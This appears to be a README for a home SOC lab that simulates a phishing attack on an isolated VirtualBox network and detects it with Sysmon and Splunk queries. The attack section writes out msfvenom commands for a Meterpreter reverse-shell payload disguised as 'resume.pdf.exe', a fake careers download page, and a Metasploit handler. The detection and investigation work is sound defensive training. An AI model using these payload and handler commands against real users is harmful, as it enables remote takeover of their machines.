# Phishing-reverse-shell-splunk-lab

## Overview

This project is a small SOC home lab built on a single laptop using VirtualBox, Windows 10, Kali Linux, Sysmon, and Splunk Enterprise. It simulates a phishing attack where a user opens a malicious attachment (`resume.pdf.exe`) delivered from an attacker web page, and then uses Splunk to detect and investigate the activity. The goal is to demonstrate practical skills in log collection, detection, and incident analysis for an entry‑level SOC Analyst role.

## Lab Architecture

- **Hypervisor:** Oracle VirtualBox (running on Windows 10 host).
- **Windows 10 VM (Victim)**
  - IP: `192.168.56.10`
  - Network: `Internal Network` (VirtualBox)
  - Role: Endpoint with Sysmon and Splunk Enterprise (index `endpoint`).
- **Kali Linux VM (Attacker)**
  - IP: `192.168.56.11`
  - Network: same `Internal Network`
  - Role: Attacker box (Nmap, msfvenom, Metasploit, Python HTTP server).

Traffic flow:
Kali (192.168.56.11)
| phishing web page + malware (resume.pdf.exe)
v
Windows 10 (192.168.56.10) -- Sysmon --> Splunk (index=endpoint)


Screenshots:
- VirtualBox Internal Network configuration  
- Windows and Kali IPs (`ipconfig` / `ip a`)

## Logging Configuration

On the Windows 10 VM:

1. Installed **Sysmon** and verified events under  
   `Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational`.
2. Installed **Splunk Enterprise** (all‑in‑one) and created index `endpoint`.
3. Placed `config/inputs.conf` into:

C:\Program Files\Splunk\etc\system\local\inputs.conf


This configuration ingests:

- `WinEventLog:Security`
- `WinEventLog:Application`
- `WinEventLog:Microsoft-Windows-Sysmon/Operational`

Validation query in Splunk:

index=endpoint earliest=-15m
| stats count by sourcetype


Screenshot: Splunk showing the three sourcetypes in `index=endpoint`.

## Attack Scenario: Phishing with Malicious Resume

### 1. Attacker setup (Kali)

On Kali, a reverse‑shell payload was generated and hosted via a simple HTTP server:

msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=192.168.56.11 LPORT=4444
-f exe -o resume.pdf.exe

Fake careers / application portal
nano index.html # simple HTML page with a "Download candidate resume (PDF)" link

python3 -m http.server 8888


Metasploit handler:

msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.11
set LPORT 4444
exploit


The web page simulates a careers portal where the user can download a “resume” attachment.

### 2. Victim behavior (Windows)

On the Windows 10 VM:

1. User browses to `http://192.168.56.11:8888` and sees the fake careers page.
2. User downloads `resume.pdf.exe` and saves it to the Desktop.
3. Real‑time protection is temporarily disabled and the user double‑clicks `resume.pdf.exe`.
4. The binary runs silently and attempts to connect back to Kali on port 4444.

Screenshots:
- Fake web page with the download link.
- Windows Desktop showing `resume.pdf.exe`.

## Detection and Investigation in Splunk

### Step 1 – Confirm log ingestion

Broad check:

index=endpoint earliest=-15m
| stats count by sourcetype


Sourcetypes present:

- `WinEventLog:Security`
- `WinEventLog:Application`
- `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### Step 2 – Find the malicious process

Search for the payload by name:

index=endpoint earliest=-30m
| search "resume.pdf.exe"


Using Sysmon data (`WinEventLog:Microsoft-Windows-Sysmon/Operational`), the following were identified:

- **Image:** full path to `resume.pdf.exe`
- **ParentImage:** the process that launched it (e.g. `explorer.exe`)
- **User:** the Windows account that executed the file
- **CommandLine:** original execution command

Screenshot: Sysmon process creation event for `resume.pdf.exe` in Splunk.

### Step 3 – Correlate outbound connection to Kali

Search for connections to the attacker IP and port:

index=endpoint earliest=-30m
| search "192.168.56.11" OR "4444"


This shows Sysmon network events where the victim connects from `192.168.56.10` to Kali (`192.168.56.11:4444`), confirming successful callback to the attacker.

Screenshot: Sysmon network event showing the connection to `192.168.56.11:4444`.

## Detection Queries

Saved (and stored in `detections/detections.md`):

### 1. Suspicious resume file executed

index=endpoint earliest=-7d
| search Image="resume.pdf.exe" OR "resume.pdf.exe"


Purpose: Detects execution of the specific malicious attachment used in the scenario.

### 2. Executable from user profile folders

index=endpoint earliest=-7d
| search Image="\Users\\Downloads\.exe" OR Image="\Users\\Desktop\.exe"


Purpose: Flags EXE files launched from common user directories where phishing payloads are often stored.

### 3. Outbound connection to attacker C2

index=endpoint earliest=-7d
| search "192.168.56.11" "4444"


Purpose: Finds potential reverse shell or C2 traffic to the Kali attacker box.

## Incident Summary

**Detection**

A Splunk search looking for EXE files executed from user Desktop/Downloads locations identified the execution of `resume.pdf.exe`, a suspicious “resume” attachment downloaded from an external web page.

**Investigation**

Using Sysmon process creation and network events, the analysis showed that `explorer.exe` launched `resume.pdf.exe` under the logged‑in user. Shortly after, the process initiated an outbound TCP connection from `192.168.56.10` to `192.168.56.11:4444`, matching the attacker Kali host that served the file and was running a Metasploit handler.

**Response**

In a real environment, the response would include terminating the malicious process, deleting the executable, blocking the attacker IP/port at network controls, resetting the user’s credentials, and scanning the host for persistence. A detection rule was created in Splunk to alert on suspicious EXE executions in user folders and outbound connections to known attacker infrastructure.

## Skills Demonstrated

- Building and configuring a small SOC home lab using VirtualBox, Windows 10, and Kali Linux on limited hardware.
- Collecting Windows Security, Application, and Sysmon logs into Splunk via custom `inputs.conf`.
- Simulating a realistic phishing scenario using a fake web page, malicious attachment, and Metasploit reverse shell.
- Writing Splunk detections for suspicious process execution and outbound C2 connections.
- Performing basic incident investigation and documenting findings in a structured way suitable for SOC Analyst workflows.

3. detections/detections.md (minimal file)

# Splunk Detections

## Suspicious resume attachment executed

index=endpoint earliest=-7d
| search "resume.pdf.exe"


## EXE executed from user profile folders

index=endpoint earliest=-7d
| search Image="\Users\\Downloads\.exe" OR Image="\Users\\Desktop\.exe"


## Outbound connection to attacker C2

index=endpoint earliest=-7d
| search "192.168.56.11" "4444"

undefined
